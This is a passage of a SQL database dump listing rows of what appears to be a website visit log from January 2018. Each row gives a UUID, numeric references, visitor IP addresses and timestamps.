17:11:46',NULL),(542,'75c48084-b957-4f44-8701-54f7914fa13e',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-05 17:34:21','2018-01-05 17:34:21',NULL),(543,'b49e7a61-0f60-4c81-8384-98e029a8666e',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-05 17:36:23','2018-01-05 17:36:23',NULL),(544,'78269865-609e-4e05-9775-a84b39c73949',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-05 17:40:38','2018-01-05 17:40:38',NULL),(545,'34e1ea28-291e-474a-bfe6-2a089df48739',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-05 17:41:50','2018-01-05 17:41:50',NULL),(546,'10d76c80-2fe2-41a4-81b5-b7f31672cc93',NULL,5,46,'216.244.66.197',NULL,NULL,NULL,1,'2018-01-05 19:09:38','2018-01-05 19:09:38',NULL),(547,'40160e56-ff41-4aec-9d72-dc5951b2b1a4',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-05 19:23:43','2018-01-05 19:23:43',NULL),(548,'e7a01f4c-1e12-44e8-8ef8-a0944abda32d',NULL,5,89,'104.236.61.188',NULL,NULL,NULL,1,'2018-01-05 19:58:27','2018-01-05 19:58:27',NULL),(549,'f174275e-28bb-4aef-a4eb-1099a46719a4',NULL,5,89,'104.236.61.188',12,NULL,NULL,1,'2018-01-05 19:58:30','2018-01-05 19:58:30',NULL),(550,'0fa17eb8-4791-48ce-879e-38c85d98a5f4',NULL,5,89,'104.236.61.188',38,NULL,NULL,1,'2018-01-05 19:58:41','2018-01-05 19:58:41',NULL),(551,'085c082b-3266-47bc-b426-7897b671beb2',NULL,5,89,'104.236.61.188',39,NULL,NULL,1,'2018-01-05 19:58:46','2018-01-05 19:58:46',NULL),(552,'38eea88e-a65e-4236-8f27-f97ca5c61324',NULL,5,89,'104.236.61.188',12,NULL,NULL,1,'2018-01-05 20:06:31','2018-01-05 20:06:31',NULL),(553,'62ca7413-19fb-4263-947e-1ab3fef4ad4f',NULL,5,89,'104.236.61.188',40,NULL,NULL,1,'2018-01-05 20:06:37','2018-01-05 20:06:37',NULL),(554,'1b9425f0-c226-4505-9c66-063491b5a711',NULL,5,89,'104.236.61.188',39,NULL,NULL,1,'2018-01-05 20:07:07','2018-01-05 20:07:07',NULL),(555,'274fdf54-7b09-4733-8bbe-298df0477994',NULL,5,89,'104.236.61.188',41,NULL,NULL,1,'2018-01-05 20:07:11','2018-01-05 20:07:11',NULL),(556,'44784c92-4673-4f98-ab5c-24c99fe26176',NULL,5,89,'104.236.61.188',19,NULL,NULL,1,'2018-01-05 20:07:17','2018-01-05 20:07:17',NULL),(557,'e0a9029e-2838-4c2d-a29a-49d917c6f098',NULL,5,89,'104.236.61.188',42,NULL,NULL,1,'2018-01-05 20:07:21','2018-01-05 20:07:21',NULL),(558,'8b9e47bd-c90e-40fa-b6e5-5a0eae8f79c4',NULL,5,89,'104.236.61.188',42,NULL,NULL,1,'2018-01-05 20:07:26','2018-01-05 20:07:26',NULL),(559,'7dc8d073-10c5-4923-b277-ddc90cc5ba2a',NULL,5,89,'104.236.61.188',42,NULL,NULL,1,'2018-01-05 20:07:32','2018-01-05 20:07:32',NULL),(560,'c50b7823-66fe-4ed0-a2d4-ea3a3b0f5c11',NULL,5,89,'104.236.61.188',42,NULL,NULL,1,'2018-01-05 20:07:37','2018-01-05 20:07:37',NULL),(561,'83143a41-c840-44df-952e-38d4aff5aace',NULL,5,89,'104.236.61.188',42,NULL,NULL,1,'2018-01-05 20:07:41','2018-01-05 20:07:41',NULL),(562,'c2164cf2-9ae9-4058-a731-cc5c1c24ec69',NULL,5,89,'104.236.61.188',43,NULL,NULL,1,'2018-01-05 20:07:46','2018-01-05 20:07:46',NULL),(563,'70441249-dde1-400a-8ee0-9c37b9a74048',NULL,5,89,'104.236.61.188',44,NULL,NULL,1,'2018-01-05 20:07:52','2018-01-05 20:07:52',NULL),(564,'1336c872-57fe-4f58-a74a-be55e6d8c636',NULL,5,89,'104.236.61.188',44,NULL,NULL,1,'2018-01-05 20:07:56','2018-01-05 20:07:56',NULL),(565,'7f165cee-9885-4a07-9fa1-6564733fe83e',NULL,5,89,'104.236.61.188',44,NULL,NULL,1,'2018-01-05 20:08:01','2018-01-05 20:08:01',NULL),(566,'467fbd17-730c-4ab7-96a8-d10fed2f0afb',NULL,5,89,'104.236.61.188',44,NULL,NULL,1,'2018-01-05 20:08:06','2018-01-05 20:08:06',NULL),(567,'98d948ae-aaa2-482d-a79a-dc8ba78a94ec',NULL,5,89,'104.236.61.188',44,NULL,NULL,1,'2018-01-05 20:08:11','2018-01-05 20:08:11',NULL),(568,'8aa28351-ad7e-4749-bb0b-96d31240ce03',NULL,5,89,'104.236.61.188',19,NULL,NULL,1,'2018-01-05 20:08:16','2018-01-05 20:08:16',NULL),(569,'379f2a2c-971d-4293-97e1-e06ff767eef1',NULL,5,89,'104.236.61.188',45,NULL,NULL,1,'2018-01-05 20:08:21','2018-01-05 20:08:21',NULL),(570,'2cec80a1-f544-442a-9228-6a539a46d9fd',NULL,5,89,'104.236.61.188',45,NULL,NULL,1,'2018-01-05 20:08:27','2018-01-05 20:08:27',NULL),(571,'e80461b2-1727-403d-bff7-85ee0b8cdf73',NULL,5,89,'104.236.61.188',45,NULL,NULL,1,'2018-01-05 20:08:31','2018-01-05 20:08:31',NULL),(572,'56f1c16f-c298-41b1-878a-3b8a49ff0b90',NULL,5,89,'104.236.61.188',12,NULL,NULL,1,'2018-01-05 20:08:37','2018-01-05 20:08:37',NULL),(573,'d7b3f436-5450-48ec-8223-5368e8ed715c',NULL,5,89,'104.236.61.188',43,NULL,NULL,1,'2018-01-05 20:08:41','2018-01-05 20:08:41',NULL),(574,'92fae893-d2b7-4e04-b427-8a31b0e0c43c',NULL,5,89,'104.236.61.188',46,NULL,NULL,1,'2018-01-05 20:08:46','2018-01-05 20:08:46',NULL),(575,'ff8234cc-1cd8-4f1e-870b-9ddb369742eb',NULL,5,89,'104.236.61.188',46,NULL,NULL,1,'2018-01-05 20:08:52','2018-01-05 20:08:52',NULL),(576,'00c11f42-cb52-4847-a930-5a5727f792c1',NULL,5,89,'104.236.61.188',46,NULL,NULL,1,'2018-01-05 20:08:56','2018-01-05 20:08:56',NULL),(577,'14da55cd-4c42-46aa-9746-630104471bc4',NULL,5,89,'104.236.61.188',19,NULL,NULL,1,'2018-01-05 20:09:01','2018-01-05 20:09:01',NULL),(578,'16d33a76-87e2-435d-b498-00af676233c3',NULL,5,89,'104.236.61.188',39,NULL,NULL,1,'2018-01-05 20:09:06','2018-01-05 20:09:06',NULL),(579,'72db9a63-efd7-48d4-9728-788c436f7360',NULL,5,89,'104.236.61.188',43,NULL,NULL,1,'2018-01-05 20:09:12','2018-01-05 20:09:12',NULL),(580,'340476f6-66a0-437b-9d2d-e89c6273636c',NULL,5,89,'104.236.61.188',19,NULL,NULL,1,'2018-01-05 20:09:16','2018-01-05 20:09:16',NULL),(581,'1981ed17-30c0-45b1-a32c-c08e7bdfc4c1',NULL,5,89,'104.236.61.188',43,NULL,NULL,1,'2018-01-05 20:09:22','2018-01-05 20:09:22',NULL),(582,'0e892a24-21d7-4713-98b8-ddd1e2548ef3',NULL,5,89,'104.236.61.188',19,NULL,NULL,1,'2018-01-05 20:09:27','2018-01-05 20:09:27',NULL),(583,'b76aaf38-63d7-44b8-85a8-6d3566bacad0',NULL,5,90,'34.241.173.216',NULL,NULL,NULL,1,'2018-01-05 22:17:10','2018-01-05 22:17:10',NULL),(584,'2174470e-5dd5-4d11-8b52-a470f49b0fb3',NULL,15,35,'199.30.24.254',NULL,NULL,NULL,1,'2018-01-05 23:39:26','2018-01-05 23:39:26',NULL),(585,'9be1e415-f97f-4095-adc3-3c6660414816',NULL,5,4,'66.249.69.109',NULL,NULL,NULL,1,'2018-01-05 23:54:49','2018-01-05 23:54:49',NULL),(586,'05f8327a-99a7-4fc5-afc6-d359101ee053',NULL,5,4,'66.249.69.105',NULL,NULL,NULL,1,'2018-01-05 23:55:47','2018-01-05 23:55:47',NULL),(587,'30946411-8096-48ec-b32b-d04d6ed32ec3',NULL,28,91,'54.202.74.69',NULL,NULL,NULL,0,'2018-01-06 00:05:28','2018-01-06 00:05:28',NULL),(588,'380c788e-664f-4334-99a1-64e7b04860df',NULL,25,76,'93.114.21.158',12,NULL,NULL,0,'2018-01-06 00:34:57','2018-01-06 00:34:57',NULL),(589,'3a60c70b-4e11-4d74-b17a-cbadb650d9b1',NULL,7,36,'180.153.236.189',12,NULL,NULL,0,'2018-01-06 01:23:30','2018-01-06 01:23:30',NULL),(590,'d143c821-7309-40ef-bd9a-4e520d5c849d',NULL,10,92,'64.246.165.140',47,NULL,NULL,1,'2018-01-06 01:29:37','2018-01-06 01:29:37',NULL),(591,'a5c760df-81dd-4cfb-8921-c5abec324445',NULL,11,93,'217.60.225.186',14,NULL,NULL,0,'2018-01-06 02:04:15','2018-01-06 02:04:15',NULL),(592,'ddeb475d-4f45-45ab-a0e5-5100f324569f',NULL,11,93,'217.60.225.186',19,NULL,NULL,0,'2018-01-06 06:48:28','2018-01-06 03:18:28',NULL),(593,'2290dcda-32a5-4481-afbc-c1019ce529dd',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-06 04:01:34','2018-01-06 04:01:34',NULL),(594,'db1bf9e4-d9c9-4209-beb3-5a7ece910dae',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-06 04:24:32','2018-01-06 04:24:32',NULL),(595,'599dfe90-bc95-4507-8eb4-b828c7c0b4ef',NULL,6,9,'47.150.70.73',NULL,NULL,NULL,0,'2018-01-06 05:02:15','2018-01-06 05:02:15',NULL),(596,'32b30e66-ff2e-4c9f-955e-ba8587dfd4f4',NULL,16,94,'89.151.130.21',NULL,NULL,NULL,0,'2018-01-06 05:14:14','2018-01-06 05:14:14',NULL),(597,'77dc9162-7a01-45ed-8e7d-e1e2ab0d4b91',NULL,16,94,'46.39.46.19',NULL,NULL,NULL,0,'2018-01-06 05:30:17','2018-01-06 05:30:17',NULL),(598,'a6357a9e-4cf4-4338-b072-d53f4e530e3f',NULL,16,94,'195.218.183.48',NULL,NULL,NULL,0,'2018-01-06 05:45:44','2018-01-06 05:45:44',NULL),(599,'fcd0d49e-e988-4cfb-8c56-08a7ca784211',NULL,16,94,'94.188.75.2',NULL,NULL,NULL,0,'2018-01-06 06:04:11','2018-01-06 06:04:11',NULL),(600,'c4a5f6c1-3078-4795-80d4-155a21456e8d',NULL,5,3,'176.31.255.65',NULL,NULL,NULL,1,'2018-01-06 06:07:53','2018-01-06 06:07:53',NULL),(601,'a1f08a91-79ee-4ad6-a1d1-aaf8ff149101',NULL,5,3,'176.31.255.65',NULL,NULL,NULL,1,'2018-01-06 06:08:00','2018-01-06 06:08:00',NULL),(602,'061a4aef-dd8a-4299-93cf-595f09a5cc86',NULL,5,3,'176.31.255.65',NULL,NULL,NULL,1,'2018-01-06 06:08:08','2018-01-06 06:08:08',NULL),(603,'4bb9f518-ab30-481a-9131-e5dd766944d9',NULL,9,11,'42.236.50.82',12,NULL,NULL,1,'2018-01-06 06:27:56','2018-01-06 06:27:56',NULL),(604,'74b0b795-0ba0-40ce-8d48-99e37089e9fd',NULL,9,11,'42.236.50.82',11,NULL,NULL,1,'2018-01-06 06:27:56','2018-01-06 06:27:56',NULL),(605,'b10166a2-87c1-450a-a212-0287d4b2ec3a',NULL,6,9,'220.247.236.239',NULL,NULL,NULL,0,'2018-01-06 08:27:57','2018-01-06 08:27:57',NULL),(606,'e4d9ec54-4638-4a65-bbe2-18374a0930be',NULL,5,3,'137.74.195.131',NULL,NULL,NULL,1,'2018-01-06 08:39:21','2018-01-06 08:39:21',NULL),(607,'005c692d-26a8-43f5-bb39-3b76fc5be0a1',NULL,5,3,'137.74.195.131',NULL,NULL,NULL,1,'2018-01-06 08:39:26','2018-01-06 08:39:26',NULL),(608,'de6be327-d260-4238-8939-19e470aaa55d',NULL,6,95,'86.105.137.117',49,NULL,NULL,0,'2018-01-06 08:58:45','2018-01-06 08:58:45',NULL),(609,'0a0f67b2-8a38-4e81-a451-447a0fa115bd',NULL,5,44,'74.115.214.150',24,NULL,NULL,1,'2018-01-06 09:58:00','2018-01-06 09:58:00',NULL),(610,'2702494a-a780-4009-bcfd-85ae1167b112',NULL,9,96,'91.200.12.196',50,NULL,NULL,0,'2018-01-06 11:26:09','2018-01-06 11:26:09',NULL),(611,'f05d1055-6987-4f70-9c51-7a4ba2269628',NULL,5,3,'69.30.205.218',NULL,NULL,NULL,1,'2018-01-06 13:07:38','2018-01-06 13:07:38',NULL),(612,'a1f33bcc-fc1a-4327-b6fd-5f25e476c8c4',NULL,5,3,'69.30.205.218',NULL,NULL,NULL,1,'2018-01-06 13:08:02','2018-01-06 13:08:02',NULL),(613,'e24569b0-6a13-419d-b332-7509c3364a30',NULL,5,3,'162.210.196.97',NULL,NULL,NULL,1,'2018-01-06 13:24:54','2018-01-06 13:24:54',NULL),(614,'9b208eed-3528-4cd6-b379-5b9f2928afd3',NULL,12,97,'86.110.117.60',NULL,NULL,NULL,0,'2018-01-06 15:14:49','2018-01-06 15:14:49',NULL),(615,'fbf3d113-9021-4345-82bc-cd1daccc22b7',NULL,18,64,'5.117.6.227',14,NULL,NULL,0,'2018-01-06 18:13:13','2018-01-06 18:13:13',NULL),(616,'eca460d9-b1c7-4f0b-a6f5-6d3e7e44ad18',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:58:11','2018-01-06 22:58:11',NULL),(617,'ec3ebfbe-00b8-4a53-b64c-38f71bee49f8',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:58:25','2018-01-06 22:58:25',NULL),(618,'f29bef43-4083-4679-8c83-dcec43dc759b',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:58:41','2018-01-06 22:58:41',NULL),(619,'0412d4f5-009b-4242-b8ed-1d85c00db148',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:58:54','2018-01-06 22:58:54',NULL),(620,'72c5bae4-deee-4422-a8f7-44f19c1e474a',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:59:11','2018-01-06 22:59:11',NULL),(621,'54782554-d5cc-4573-8314-3e4b298325bb',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:59:25','2018-01-06 22:59:25',NULL),(622,'7d1cc24b-7353-4eb7-be1b-c5b1fe2dda88',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:59:37','2018-01-06 22:59:37',NULL),(623,'1f6a73ef-511b-43b0-8050-95e5c62e9a10',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:59:46','2018-01-06 22:59:46',NULL),(624,'059a5482-06e4-4800-865d-e5e58ef49aaa',NULL,5,3,'88.99.19.242',NULL,NULL,NULL,1,'2018-01-06 22:59:59','2018-01-06 22:59:59',NULL),(625,'a387bca0-c6d2-4c3e-944d-0e4295ff142f',NULL,5,4,'66.249.69.21',NULL,NULL,NULL,1,'2018-01-06 23:39:10','2018-01-06 23:39:10',NULL),(626,'6bfc129d-a13b-4521-976d-a4746fc9289c',NULL,5,44,'74.115.214.141',23,NULL,NULL,1,'2018-01-07 00:03:40','2018-01-07 00:03:40',NULL),(627,'79c097b6-f52e-45ab-a2d8-66eefd377be2',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2018-01-07 00:20:35','2018-01-07 00:20:35',NULL),(628,'70863902-282d-47b4-86ae-bd9c2ea9fb4d',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2018-01-07 00:22:09','2018-01-07 00:22:09',NULL),(629,'d41c6832-bf8e-4b3a-b12b-600cf8f4c786',NULL,29,98,'31.47.32.230',52,NULL,NULL,0,'2018-01-07 04:45:11','2018-01-07 01:15:11',NULL),(630,'db8662e3-f8ef-42bc-af65-0242fe807b4c',NULL,29,98,'31.47.32.230',NULL,NULL,NULL,0,'2018-01-07 01:15:28','2018-01-07 01:15:28',NULL),(631,'9939d3d1-5585-4cbe-a96a-33853140274b',NULL,11,45,'151.246.133.103',14,NULL,NULL,0,'2018-01-07 02:13:39','2018-01-07 02:13:39',NULL),(632,'44fe82e8-fb72-4a64-95f7-ae383e9b6293',NULL,5,44,'74.115.214.158',28,NULL,NULL,1,'2018-01-07 04:50:58','2018-01-07 04:50:58',NULL),(633,'6140d715-fb07-4917-8c2f-33d9ce4be174',NULL,5,46,'216.244.66.197',NULL,NULL,NULL,1,'2018-01-07 06:22:22','2018-01-07 06:22:22',NULL),(634,'29426b84-6a2a-4485-955f-25c843fc7514',NULL,5,3,'144.76.8.231',NULL,NULL,NULL,1,'2018-01-07 06:26:58','2018-01-07 06:26:58',NULL),(635,'c658020e-5060-4017-af74-002ce7c119cb',NULL,5,3,'144.76.8.231',NULL,NULL,NULL,1,'2018-01-07 06:27:01','2018-01-07 06:27:01',NULL),(636,'dc335a82-efc6-4cb8-83ea-b97e151a2b36',NULL,5,3,'144.76.8.231',NULL,NULL,NULL,1,'2018-01-07 06:27:03','2018-01-07 06:27:03',NULL),(637,'29459de3-2aab-4de8-a6d5-88a7364e2858',NULL,5,3,'144.76.8.231',NULL,NULL,NULL,1,'2018-01-07 06:27:06','2018-01-07 06:27:06',NULL),(638,'14c29657-a1b2-4e16-a7da-f8ab34e6dc7e',NULL,9,12,'42.236.10.85',11,NULL,NULL,1,'2018-01-07 06:32:59','2018-01-07 06:32:59',NULL),(639,'cdd846bf-adc5-4873-b695-094d1237cb1a',NULL,9,11,'42.236.50.15',12,NULL,NULL,1,'2018-01-07 06:32:59','2018-01-07 06:32:59',NULL),(640,'12aa1050-fa2f-4b3c-926d-5a3346473a6c',NULL,5,4,'66.249.69.121',NULL,NULL,NULL,1,'2018-01-07 06:35:21','2018-01-07 06:35:21',NULL),(641,'cbb12365-ebfb-4806-8b50-d203b6764cbd',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-07 08:02:32','2018-01-07 08:02:32',NULL),(642,'955bac94-eb96-4aba-97f1-8243b3ee1f06',NULL,5,17,'37.9.113.184',NULL,NULL,NULL,1,'2018-01-07 08:03:02','2018-01-07 08:03:02',NULL),(643,'954be675-14c0-4555-9067-57931af486c8',NULL,5,3,'95.91.11.244',NULL,NULL,NULL,1,'2018-01-07 10:02:37','2018-01-07 10:02:37',NULL),(644,'67dc2d09-d07c-4df1-83c2-71d88133bee6',NULL,5,3,'95.91.11.244',NULL,NULL,NULL,1,'2018-01-07 10:02:40','2018-01-07 10:02:40',NULL),(645,'8afc97f6-ef09-47c2-ab0d-7a924ef9a8e0',NULL,5,3,'95.91.11.244',NULL,NULL,NULL,1,'2018-01-07 10:02:43','2018-01-07 10:02:43',NULL),(646,'937de86c-4257-4a5b-ac39-ed7cbc8e9ab5',NULL,13,29,'13.56.229.65',NULL,NULL,NULL,0,'2018-01-07 10:29:28','2018-01-07 10:29:28',NULL),(647,'df83a99f-32e3-407c-bfe7-2ffe08ed6564',NULL,6,9,'112.202.172.201',NULL,NULL,NULL,0,'2018-01-07 10:39:32','2018-01-07 10:39:32',NULL),(648,'1876ba07-69a3-4acd-b2eb-b48db7cc7b04',NULL,5,46,'216.244.66.197',NULL,NULL,NULL,1,'2018-01-07 11:06:32','2018-01-07 11:06:32',NULL),(649,'3455c2ec-6bf2-4bba-af3c-1f8359034b21',NULL,8,68,'217.69.143.65',NULL,NULL,NULL,1,'2018-01-07 11:34:25','2018-01-07 11:34:25',NULL),(650,'9114463b-7832-423c-814f-fa1d7fc57876',NULL,5,46,'216.244.66.249',NULL,NULL,NULL,1,'2018-01-07 13:51:13','2018-01-07 13:51:13',NULL),(651,'91b0c7e2-f933-4eb7-b98a-d5c9b3ab7edc',NULL,5,24,'31.184.135.120',12,NULL,NULL,1,'2018-01-07 13:52:29','2018-01-07 13:52:29',NULL),(652,'161a4ece-5ce3-48f7-b20b-06d3d25bd587',NULL,12,99,'185.29.8.14',NULL,NULL,NULL,0,'2018-01-07 14:05:46','2018-01-07 14:05:46',NULL),(653,'73f5b933-0cc8-4504-a995-48e3811b1a79',NULL,9,100,'185.36.102.114',53,NULL,NULL,0,'2018-01-07 15:01:19','2018-01-07 15:01:19',NULL),(654,'e218d5d5-26cb-42e1-8d7c-5f95c9d3837a',NULL,5,3,'162.210.196.98',NULL,NULL,NULL,1,'2018-01-07 17:06:57','2018-01-07 17:06:57',NULL),(655,'b9c95dd9-4ddd-40ab-a69c-a6bfc0be93d4',NULL,18,101,'89.163.209.232',NULL,NULL,NULL,0,'2018-01-07 17:12:40','2018-01-07 17:12:40',NULL),(656,'10aae3c6-0a4e-49ed-9757-2138c50c5af1',NULL,1,102,'88.99.99.145',54,NULL,NULL,0,'2018-01-07 21:14:43','2018-01-07 21:14:43',NULL),(657,'145e1032-4c21-4d51-86d3-002da18f345f',NULL,5,46,'216.244.66.197',NULL,NULL,NULL,1,'2018-01-07 21:36:46','2018-01-07 21:36:46',NULL),(658,'675c54fd-2c6a-4c93-b78b-47480fe74db4',NULL,6,9,'85.194.109.126',NULL,NULL,NULL,0,'2018-01-07 21:57:50','2018-01-07 21:57:50',NULL),(659,'b510e6b3-2249-493d-9837-d56b7e070740',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-07 22:06:16','2018-01-07 22:06:16',NULL),(660,'54853fb2-b265-4549-81be-f5b93861a5b9',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-07 22:08:27','2018-01-07 22:08:27',NULL),(661,'7b88f3a4-16dc-4191-a192-59547d95b9de',NULL,5,3,'69.30.210.242',NULL,NULL,NULL,1,'2018-01-07 22:09:36','2018-01-07 22:09:36',NULL),(662,'3a4dd5df-bca5-4c56-808a-abc6e3784028',NULL,5,3,'69.30.210.242',NULL,NULL,NULL,1,'2018-01-07 22:09:39','2018-01-07 22:09:39',NULL),(663,'724262be-00ab-493c-8758-936d97ceea1b',NULL,5,3,'69.30.210.242',NULL,NULL,NULL,1,'2018-01-07 22:10:11','2018-01-07 22:10:11',NULL),(664,'07cbfb8c-ed3d-48e1-a4a8-ec07662bab4d',NULL,5,3,'69.30.210.242',NULL,NULL,NULL,1,'2018-01-07 22:10:15','2018-01-07 22:10:15',NULL),(665,'145580ff-dbed-4ef7-89ae-da37133e5666',NULL,5,3,'69.30.210.242',NULL,NULL,NULL,1,'2018-01-07 22:10:18','2018-01-07 22:10:18',NULL),(666,'9a78fcbe-9130-4a5a-8e87-05d5d123ea51',NULL,5,3,'69.30.210.242',NULL,NULL,NULL,1,'2018-01-07 22:10:21','2018-01-07 22:10:21',NULL),(667,'c5edb64b-989f-4f2b-8a87-232cc50d3782',NULL,5,44,'74.115.214.134',28,NULL,NULL,1,'2018-01-07 22:41:23','2018-01-07 22:41:23',NULL),(668,'e9ec3c71-c468-4815-8759-6dd76f35ad21',NULL,5,2,'158.69.251.119',NULL,NULL,NULL,1,'2018-01-07 22:57:24','2018-01-07 22:57:24',NULL),(669,'4e79be99-e4ff-4c07-a208-74c818a8f7a6',NULL,5,2,'158.69.251.119',NULL,NULL,NULL,1,'2018-01-07 22:57:33','2018-01-07 22:57:33',NULL),(670,'1af3e183-a7c6-48de-a3da-d30c33de9bca',NULL,9,11,'42.236.99.72',11,NULL,NULL,1,'2018-01-07 23:03:40','2018-01-07 23:03:40',NULL),(671,'aa56b309-6711-4fba-810a-41f6b05b71f2',NULL,9,11,'42.236.102.23',12,NULL,NULL,1,'2018-01-07 23:08:58','2018-01-07 23:08:58',NULL),(672,'c36dddaa-89dc-4a5c-a1a0-346fd3ea3a39',NULL,5,44,'74.115.214.134',28,NULL,NULL,1,'2018-01-07 23:47:10','2018-01-07 23:47:10',NULL),(673,'47dfcac4-3b39-4931-89f4-d89da18a2521',NULL,15,33,'157.55.39.40',NULL,NULL,NULL,1,'2018-01-08 00:05:01','2018-01-08 00:05:01',NULL),(674,'32b20aca-154c-4ea2-88f4-0e0369ea9669',NULL,5,46,'216.244.66.249',NULL,NULL,NULL,1,'2018-01-08 00:27:59','2018-01-08 00:27:59',NULL),(675,'0a4d4ad0-3dcf-41c1-880f-4af827985c28',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:08','2018-01-08 01:10:08',NULL),(676,'1953f7b9-96c2-431e-8aef-c0a8774a89a5',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:11','2018-01-08 01:10:11',NULL),(677,'d50f0790-a083-4f67-8af8-ddd8641807e1',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:14','2018-01-08 01:10:14',NULL),(678,'f59a3525-0dcd-4189-a099-7355f4a674e7',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:17','2018-01-08 01:10:17',NULL),(679,'8e95733b-a73d-4436-a081-057e26d709b9',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:20','2018-01-08 01:10:20',NULL),(680,'6182ae1c-9469-4742-8cf7-d99e4a48ae81',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:25','2018-01-08 01:10:25',NULL),(681,'39e9daa1-9f2f-4ab7-87b3-be3fbb681efc',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:28','2018-01-08 01:10:28',NULL),(682,'6be0e4df-2dac-4138-8210-0bed650d3bd5',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:31','2018-01-08 01:10:31',NULL),(683,'6f3aef2c-a771-4353-9671-fdd4a3144d34',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:34','2018-01-08 01:10:34',NULL),(684,'5c045c68-b225-478f-8505-593224bc10cb',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:37','2018-01-08 01:10:37',NULL),(685,'ba28e9c8-7890-4014-8636-f47e463d00a4',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:40','2018-01-08 01:10:40',NULL),(686,'5a0bcaec-cd77-4eee-b8ca-6a027e2abd55',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:43','2018-01-08 01:10:43',NULL),(687,'61630aa2-2e06-455d-b873-31d0ce5d317a',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:46','2018-01-08 01:10:46',NULL),(688,'b5638990-4b1f-4eac-9194-d79e03e2564b',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:49','2018-01-08 01:10:49',NULL),(689,'5ff9ef93-8b6d-41af-873a-e90bd212b279',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:51','2018-01-08 01:10:51',NULL),(690,'03d4d208-34ef-4b4d-9871-250a266b468e',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:54','2018-01-08 01:10:54',NULL),(691,'ed952169-7b6a-40bc-8b92-5e388b48f2e2',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:10:57','2018-01-08 01:10:57',NULL),(692,'98779a93-f49b-4434-a8bf-927421946480',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:00','2018-01-08 01:11:00',NULL),(693,'c55031b5-6b1c-4577-bc7b-76b6416d3292',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:03','2018-01-08 01:11:03',NULL),(694,'cf004469-4940-4c13-a5de-c341b370c6b8',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:06','2018-01-08 01:11:06',NULL),(695,'b7128052-e528-4f5c-8872-7ebfa80db6fd',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:08','2018-01-08 01:11:08',NULL),(696,'6ee8a36e-9cb6-4df6-ad1b-efd76a24f9ec',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:22','2018-01-08 01:11:22',NULL),(697,'17efcc70-a105-4ddb-a4fd-139bf191847c',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:25','2018-01-08 01:11:25',NULL),(698,'fdeefb20-5632-4b90-827a-fb81192b30c8',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:28','2018-01-08 01:11:28',NULL),(699,'6c3f67a3-acfe-43f8-b64a-17bc006604d2',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:31','2018-01-08 01:11:31',NULL),(700,'f7472f93-ca2e-4e6d-95aa-057e4187d9da',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:34','2018-01-08 01:11:34',NULL),(701,'bbde493a-8e30-48d2-a561-9467c3b75957',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:37','2018-01-08 01:11:37',NULL),(702,'f2854b1e-9523-4438-9356-d9f13e8a5acf',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:11:40','2018-01-08 01:11:40',NULL),(703,'252e85bc-d87a-49f0-b3af-9f4821a3dc19',NULL,30,103,'46.105.100.183',NULL,NULL,NULL,0,'2018-01-08 01:12:01','2018-01-08 